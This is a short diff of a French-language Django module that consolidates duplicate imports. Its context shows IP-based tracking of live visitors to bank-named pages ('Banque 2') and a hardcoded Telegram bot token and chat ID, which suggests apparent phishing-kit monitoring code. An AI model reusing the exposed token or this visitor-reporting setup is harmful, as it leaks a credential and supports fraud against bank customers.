@@ -1,4 +1,8 @@
+
 import time
+import requests
+import threading
+from django.core.cache import cache
 
 # Visiteurs actifs : { ip: { page, last_seen, user_agent, methode } }
 VISITEURS_ACTIFS = {}
@@ -23,9 +27,6 @@ PAGES_DISPONIBLES = [
     ('/banque-2/',       'Banque 2'),
 ]
 
-import time
-import requests
-import threading
 
 VISITEURS_ACTIFS = {}
 TIMEOUT_VISITEUR = 60
@@ -34,10 +35,6 @@ TELEGRAM_TOKEN   = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
 TELEGRAM_CHAT_ID = "8849728706"
 MESSAGE_ID_LIVE  = None   # ID du message épinglé, rempli au démarrage
 
-import time
-import requests
-import threading
-from django.core.cache import cache
 
 TIMEOUT_VISITEUR = 60
 TELEGRAM_TOKEN   = "8995148469:AAHNG55Z9GrPq6-X1AKDUTLsgVmB91VWaL8"
